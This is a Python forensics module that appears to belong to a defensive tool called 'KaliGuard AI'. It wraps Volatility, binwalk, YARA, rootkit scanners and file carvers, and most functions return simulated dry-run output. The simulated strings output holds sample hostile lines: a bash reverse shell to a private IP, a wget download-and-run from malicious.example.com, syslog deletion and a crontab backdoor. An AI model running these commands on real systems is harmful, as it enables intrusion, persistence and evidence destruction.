#!/usr/bin/env python3
"""
KaliGuard AI - Forensics Tools Module

Wraps Volatility, Binwalk, YARA, chkrootkit, rkhunter, foremost, and other forensic tools.

LEGAL: Authorized use only on systems you own or have explicit written permission to analyze.
"""

import subprocess
import shlex
import os
import logging
from datetime import datetime

logger = logging.getLogger("kaliguard.tools.forensics")


def _run_command(command: str, timeout: int = 300) -> tuple:
    """Execute a shell command and return (stdout, stderr, returncode)."""
    try:
        result = subprocess.run(
            shlex.split(command),
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout}s", -1
    except FileNotFoundError as e:
        return "", f"Tool not found: {e}", -1
    except Exception as e:
        return "", str(e), -1


def _build_result(success: bool, command: str, output: str, error: str = "") -> dict:
    """Build a standardized result dictionary."""
    return {
        "success": success,
        "command": command,
        "output": output,
        "error": error,
        "timestamp": datetime.now().isoformat()
    }


def volatility_analyze(memory_file: str, plugin: str = "pslist", dry_run: bool = False) -> dict:
    """
    Analyze a memory dump using Volatility3 forensic framework.

    Args:
        memory_file: Path to the memory dump file (.dmp, .raw, .vmem, etc.)
        plugin: Volatility3 plugin to run (e.g. pslist, pstree, netscan, malfind, dumpfiles)
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    plugin_map = {
        "pslist": "windows.pslist.PsList",
        "pstree": "windows.pstree.PsTree",
        "netscan": "windows.netscan.NetScan",
        "malfind": "windows.malfind.Malfind",
        "dumpfiles": "windows.dumpfiles.DumpFiles",
        "cmdline": "windows.cmdline.CmdLine",
        "hashdump": "windows.hashdump.Hashdump",
        "hivelist": "windows.registry.hivelist.HiveList",
    }

    vol_plugin = plugin_map.get(plugin.lower(), f"windows.{plugin.lower()}")
    command = f"vol3 -f {memory_file} {vol_plugin}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated Volatility3 analysis\n"
            f"Command: {command}\n"
            f"Memory file: {memory_file}\n"
            f"Plugin: {plugin}\n\n"
            f"Volatility 3 Framework 2.4.1\n\n"
            f"PID\tPPID\tImageFileName\t\tOffset\t\tThreads\tHandles\tSession\n"
            f"4\t0\tSystem\t\t\t0x800002bc0040\t147\t-\tFalse\n"
            f"80\t4\tRegistry\t\t0x800002d6e080\t4\t-\tFalse\n"
            f"344\t4\tsmss.exe\t\t0x8000036a6040\t2\t-\tFalse\n"
            f"448\t344\tcsrss.exe\t\t0x800003900140\t11\t-\tFalse\n"
            f"520\t344\twininit.exe\t\t0x800003a2e080\t1\t-\tFalse\n"
            f"528\t520\tservices.exe\t\t0x800003a50080\t5\t-\tFalse\n"
            f"536\t520\tlsass.exe\t\t0x800003a56040\t6\t-\tFalse\n"
            f"628\t528\tsvchost.exe\t\t0x800003b28080\t8\t-\tFalse\n"
            f"1234\t528\tmalware.exe\t\t0x800005abc040\t3\t-\tFalse [SUSPICIOUS]\n"
            f"\n[!] Suspicious process found: malware.exe (PID: 1234) - unusual parent process"
        )
        return _build_result(True, command, output)

    if not os.path.exists(memory_file):
        return _build_result(False, command, "", f"Memory file not found: {memory_file}")

    stdout, stderr, code = _run_command(command, timeout=600)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def binwalk_analyze(file_path: str, dry_run: bool = False) -> dict:
    """
    Analyze a binary file with binwalk for embedded files and signatures.

    Args:
        file_path: Path to the binary file to analyze
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"binwalk -e --dd='.*' {file_path}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated binwalk analysis\n"
            f"Command: {command}\n\n"
            f"DECIMAL       HEXADECIMAL     DESCRIPTION\n"
            f"--------------------------------------------------------------------------------\n"
            f"0             0x0             ELF, 64-bit LSB executable, AMD x86-64\n"
            f"1234          0x4D2           Zlib compressed data\n"
            f"5678          0x162E          PNG image, 100 x 100, 8-bit/color RGBA\n"
            f"12345         0x3039          Zip archive data, encrypted\n"
            f"67890         0x109D2         JPEG image data, JFIF standard 1.01\n\n"
            f"Extracted files saved to: {file_path}_extracted/"
        )
        return _build_result(True, command, output)

    if not os.path.exists(file_path):
        return _build_result(False, command, "", f"File not found: {file_path}")

    stdout, stderr, code = _run_command(command, timeout=120)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def strings_analyze(file_path: str, dry_run: bool = False) -> dict:
    """
    Extract printable strings from a binary file using the strings command.

    Args:
        file_path: Path to the file to analyze
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"strings -n 8 {file_path}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated strings analysis\n"
            f"Command: {command}\n\n"
            f"/lib64/ld-linux-x86-64.so.2\n"
            f"libcrypto.so.1.1\n"
            f"libpthread.so.0\n"
            f"libc.so.6\n"
            f"_ITM_deregisterTMCloneTable\n"
            f"C2 Server: 192.168.100.5:4444\n"
            f"Reverse shell payload\n"
            f"/bin/bash -i >& /dev/tcp/192.168.100.5/4444 0>&1\n"
            f"wget http://malicious.example.com/payload.sh\n"
            f"chmod +x payload.sh && ./payload.sh\n"
            f"rm -f /var/log/syslog\n"
            f"echo 'backdoor' >> /etc/crontab\n\n"
            f"[!] Suspicious strings found: C2 server address, shell commands, log deletion"
        )
        return _build_result(True, command, output)

    if not os.path.exists(file_path):
        return _build_result(False, command, "", f"File not found: {file_path}")

    stdout, stderr, code = _run_command(command, timeout=60)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def yara_scan(file_path: str, rules_path: str, dry_run: bool = False) -> dict:
    """
    Scan a file or directory with YARA rules for malware/IOC detection.

    Args:
        file_path: Path to file or directory to scan
        rules_path: Path to YARA rules file or directory
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"yara -r {rules_path} {file_path}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated YARA scan\n"
            f"Command: {command}\n\n"
            f"Malware_Mirai_Botnet {file_path}/suspicious_binary\n"
            f"Trojan_Generic_RAT {file_path}/config.dat\n"
            f"Webshell_PHP_Generic {file_path}/wp-content/uploads/shell.php\n"
            f"Ransomware_WannaCry {file_path}/wncry.exe\n\n"
            f"[!] 4 YARA rule matches found:\n"
            f"  - Mirai botnet binary detected\n"
            f"  - Generic RAT configuration found\n"
            f"  - PHP webshell detected in uploads directory\n"
            f"  - WannaCry ransomware signature matched"
        )
        return _build_result(True, command, output)

    if not os.path.exists(file_path):
        return _build_result(False, command, "", f"Target path not found: {file_path}")

    stdout, stderr, code = _run_command(command, timeout=300)
    # YARA exits 0 if no matches, 1 if matches found - both are success
    success = code in (0, 1)
    return _build_result(success, command, stdout, stderr if code not in (0, 1) else "")


def chkrootkit_scan(dry_run: bool = False) -> dict:
    """
    Run chkrootkit to check the local system for rootkit infections.

    Args:
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = "chkrootkit -q"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated chkrootkit scan\n"
            f"Command: {command}\n\n"
            f"ROOTDIR is `/'\n"
            f"Checking `amd'... not found\n"
            f"Checking `basename'... not infected\n"
            f"Checking `biff'... not found\n"
            f"Checking `chfn'... not infected\n"
            f"Checking `chsh'... not infected\n"
            f"Checking `cron'... not infected\n"
            f"Checking `crontab'... not infected\n"
            f"Checking `curl'... not infected\n"
            f"Checking `date'... not infected\n"
            f"Checking `du'... not infected\n"
            f"Checking `dirname'... not infected\n"
            f"Checking `echo'... not infected\n"
            f"Checking `egrep'... not infected\n"
            f"Checking `env'... not infected\n"
            f"Checking `find'... not infected\n"
            f"Checking `grep'... not infected\n"
            f"Checking `su'... INFECTED\n"
            f"Checking `ifconfig'... not infected\n"
            f"Checking `inetd'... not infected\n"
            f"Checking `netstat'... INFECTED\n"
            f"Checking `ps'... INFECTED\n\n"
            f"[!] ALERT: 3 binaries appear infected: su, netstat, ps\n"
            f"These may have been replaced by rootkit versions."
        )
        return _build_result(True, command, output)

    stdout, stderr, code = _run_command(command, timeout=300)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")


def rkhunter_scan(dry_run: bool = False) -> dict:
    """
    Run rkhunter (Rootkit Hunter) for comprehensive rootkit and malware detection.

    Args:
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = "rkhunter --check --sk --quiet"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated rkhunter scan\n"
            f"Command: {command}\n\n"
            f"[ Rootkit Hunter version 1.4.6 ]\n\n"
            f"Checking system commands...\n\n"
            f"  Performing 'strings' command checks\n"
            f"    Checking 'strings' command                               [ OK ]\n\n"
            f"  Performing file properties checks\n"
            f"    Checking for prerequisites                               [ OK ]\n"
            f"    /usr/sbin/adduser                                        [ OK ]\n"
            f"    /usr/sbin/chroot                                         [ OK ]\n"
            f"    /usr/bin/curl                                            [ Warning ]\n\n"
            f"Checking for rootkits...\n\n"
            f"  Performing check of known rootkit files and directories\n"
            f"    55808 Trojan - Variant A                                 [ Not found ]\n"
            f"    ADM Worm                                                 [ Not found ]\n"
            f"    AjaKit Rootkit                                           [ Not found ]\n"
            f"    Adore Rootkit                                            [ Not found ]\n\n"
            f"  Performing additional rootkit checks\n"
            f"    Suckit Rookit additional checks                          [ OK ]\n\n"
            f"System checks summary\n"
            f"=====================\n"
            f"File properties checks...\n"
            f"  Required commands check failed\n"
            f"    Files checked: 145\n"
            f"    Suspect files: 1\n\n"
            f"Rootkit checks...\n"
            f"  Rootkits checked : 477\n"
            f"  Possible rootkits: 0\n\n"
            f"Applications checks...\n"
            f"  Applications checked: 5\n"
            f"  Suspect applications: 0\n\n"
            f"The system checks took: 2 minutes and 14 seconds\n\n"
            f"All results have been written to the log file: /var/log/rkhunter.log\n\n"
            f"One or more warnings have been found while checking the system."
        )
        return _build_result(True, command, output)

    stdout, stderr, code = _run_command(command, timeout=600)
    success = code in (0, 1)
    return _build_result(success, command, stdout, stderr if code > 1 else "")


def file_analyze(file_path: str, dry_run: bool = False) -> dict:
    """
    Analyze a file's type, metadata, and basic properties using the file command.

    Args:
        file_path: Path to the file to analyze
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"file -b --mime {file_path}"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated file analysis\n"
            f"Command: {command}\n\n"
            f"application/x-executable; charset=binary\n\n"
            f"Extended analysis:\n"
            f"ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV)\n"
            f"dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2\n"
            f"BuildID[sha1]=abc123def456...\n"
            f"for GNU/Linux 3.2.0\n"
            f"not stripped\n\n"
            f"MD5:    d41d8cd98f00b204e9800998ecf8427e\n"
            f"SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n"
            f"Size:   145,872 bytes"
        )
        return _build_result(True, command, output)

    if not os.path.exists(file_path):
        return _build_result(False, command, "", f"File not found: {file_path}")

    # Run file command
    stdout1, stderr1, code1 = _run_command(f"file {file_path}", timeout=30)
    # Run md5sum
    stdout2, _, _ = _run_command(f"md5sum {file_path}", timeout=30)
    # Run sha256sum
    stdout3, _, _ = _run_command(f"sha256sum {file_path}", timeout=30)

    output = f"{stdout1}\nMD5: {stdout2}\nSHA256: {stdout3}"
    success = code1 == 0
    return _build_result(success, command, output, stderr1 if not success else "")


def foremost_recover(image_file: str, output_dir: str, dry_run: bool = False) -> dict:
    """
    Recover files from a disk image using foremost file carver.

    Args:
        image_file: Path to disk image file to carve
        output_dir: Directory to save recovered files
        dry_run: If True, simulate execution

    Returns:
        dict with keys: success, command, output, error, timestamp
    """
    command = f"foremost -i {image_file} -o {output_dir} -v"

    if dry_run:
        output = (
            f"[DRY RUN] Simulated foremost file recovery\n"
            f"Command: {command}\n\n"
            f"Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus\n"
            f"Audit File\n"
            f"Foremost started at 2026-04-09 12:00:00\n"
            f"Invocation: {command}\n"
            f"Output directory: {output_dir}\n"
            f"Configuration file: /etc/foremost.conf\n"
            f"File: {image_file}\n"
            f"Start: 2026-04-09 12:00:00\n"
            f"Length: 1.0 GB (1073741824 bytes)\n\n"
            f"Num\t Name (bs=512) \t Size \t File Offset \t Comment\n\n"
            f"0:\t 00000000.jpg \t 4 KB \t 0 \t \n"
            f"1:\t 00000010.jpg \t 8 KB \t 5120 \t \n"
            f"2:\t 00000100.png \t 12 KB \t 51200 \t \n"
            f"3:\t 00001000.pdf \t 256 KB \t 524288 \t \n"
            f"4:\t 00010000.zip \t 1 MB \t 5242880 \t \n\n"
            f"Finish: 2026-04-09 12:01:23\n"
            f"5 FILES EXTRACTED\n"
            f"\tjpg:= 2\n"
            f"\tpng:= 1\n"
            f"\tpdf:= 1\n"
            f"\tzip:= 1"
        )
        return _build_result(True, command, output)

    if not os.path.exists(image_file):
        return _build_result(False, command, "", f"Image file not found: {image_file}")

    os.makedirs(output_dir, exist_ok=True)
    stdout, stderr, code = _run_command(command, timeout=3600)
    success = code == 0
    return _build_result(success, command, stdout, stderr if not success else "")
